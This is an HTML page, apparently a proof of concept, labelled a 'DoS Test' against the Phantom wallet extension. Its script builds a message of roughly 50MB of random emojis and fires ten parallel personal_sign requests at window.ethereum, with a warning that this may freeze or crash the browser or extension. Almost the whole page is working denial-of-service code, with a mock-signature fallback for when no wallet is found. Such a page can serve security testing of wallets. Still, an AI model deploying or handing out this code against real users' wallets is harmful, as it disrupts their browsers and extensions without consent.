<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <title>DoS Test - Phantom Wallet</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    body {
      background: #111;
      color: #eee;
      font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
      padding: 32px;
      text-align: center;
    }
    .card {
      background: #0f1720;
      border-radius: 12px;
      padding: 20px;
      max-width: 600px;
      margin: 0 auto;
      box-shadow: 0 6px 20px rgba(0,0,0,0.6);
    }
    h1 { margin: 0 0 16px 0; font-size: 24px; }
    p { margin: 0 0 12px 0; color: #bfc9d9; }
    pre {
      margin-top: 12px;
      background: #071021;
      padding: 12px;
      border-radius: 8px;
      white-space: pre-wrap;
      word-break: break-all;
      max-height: 300px;
      overflow: auto;
      color: #e6eef8;
    }
    .warn { color: #ffcc00; }
    button {
      background: #6b21a8;
      color: white;
      border: none;
      padding: 10px 20px;
      border-radius: 8px;
      cursor: pointer;
      font-size: 16px;
    }
    button:hover { background: #5b1b9d; }
  </style>
</head>
<body>
  <div class="card" id="card">
    <h1>DoS Test - Phantom Wallet</h1>
    <p>Click the button to trigger a resource-intensive signing request.</p>
    <p class="warn">Warning: This may freeze or crash your browser/extension. Use with caution and save your work!</p>
    <p>Test message length is set to ~50MB. Multiple concurrent signs will be attempted.</p>
    <button id="startDos">Start DoS Test</button>
    <pre id="output">Ready. Click the button to begin.</pre>
  </div>

  <script>
    // CONFIG
    const TEST_MESSAGE_LENGTH = 50000000; // ~50MB message
    const PARALLEL_SIGN_COUNT = 10; // 10 concurrent signing attempts

    const outEl = document.getElementById('output');
    const startButton = document.getElementById('startDos');

    function log(...args) {
      const line = args.map(a => (typeof a === 'string' ? a : JSON.stringify(a))).join(' ');
      outEl.textContent += line + "\n";
      outEl.scrollTop = outEl.scrollHeight;
      console.log(...args);
    }

    // Prepare the message with random emojis
    let testMessage = null;
    window.addEventListener('load', () => {
      log(`Preparing message of length ${TEST_MESSAGE_LENGTH} with emojis...`);
      const emojis = ['â˜ ï¸', 'ðŸ˜ˆ', 'ðŸ’€'];
      testMessage = new Array(Math.floor(TEST_MESSAGE_LENGTH / 3))
        .fill()
        .map(() => emojis[Math.floor(Math.random() * emojis.length)])
        .join('');
      log('Message prepared. Click the button to start the DoS test.');
    });

    // Mock-sign function
    function mockSign(index) {
      const fakeSig = `0xMOCKSIG_${index}_${Math.random().toString(36).slice(2,10)}`;
      return Promise.resolve(fakeSig);
    }

    // Attempt real signing with fallback to mock
    async function trySign(index, fromAddress) {
      if (!window.ethereum) {
        log(`No wallet detected â€” using mock signature for #${index}`);
        return mockSign(index);
      }

      try {
        const sig = await ethereum.request({
          method: 'personal_sign',
          params: [testMessage, fromAddress],
        });
        return sig;
      } catch (err) {
        log(`Sign attempt #${index} failed: ${err.message || err}. Falling back to mock.`);
        return mockSign(index);
      }
    }

    // Batch signing routine with parallel execution
    async function signBatchDos() {
      startButton.disabled = true;
      outEl.textContent = ''; // clear
      log('DoS test started. Triggering parallel signing attempts...');

      if (!window.ethereum) {
        log('â˜ ï¸ No window.ethereum detected. Using mock mode for all signatures.');
        const promises = Array.from({ length: PARALLEL_SIGN_COUNT }, (_, i) => mockSign(i + 1));
        const results = await Promise.all(promises);
        results.forEach((sig, i) => log(`âœ… Mock signed [${i + 1}]: ${sig}`));
        log('Finished mock-signing.');
        startButton.disabled = false;
        return;
      }

      let accounts;
      try {
        accounts = await ethereum.request({ method: 'eth_requestAccounts' });
      } catch (err) {
        log('Account request failed. Switching to mock mode. Error:', err.message || err);
        const promises = Array.from({ length: PARALLEL_SIGN_COUNT }, (_, i) => mockSign(i + 1));
        const results = await Promise.all(promises);
        results.forEach((sig, i) => log(`âœ… Mock signed [${i + 1}]: ${sig}`));
        log('Finished mock-signing after failed account request.');
        startButton.disabled = false;
        return;
      }

      const from = accounts[0];
      log(`Connected account: ${from}`);

      const promises = Array.from({ length: PARALLEL_SIGN_COUNT }, (_, i) => trySign(i + 1, from));
      const results = await Promise.all(promises);
      results.forEach((sig, i) => log(`âœ… Result for #${i + 1}: ${sig}`));
      log('Done with DoS test signing attempts.');
      startButton.disabled = false;
    }

    // Attach click handler to button
    startButton.addEventListener('click', () => {
      signBatchDos().catch(err => {
        log('Unexpected error in signBatchDos:', err.message || err);
        startButton.disabled = false;
      });
    });
  </script>
</body>
</html>
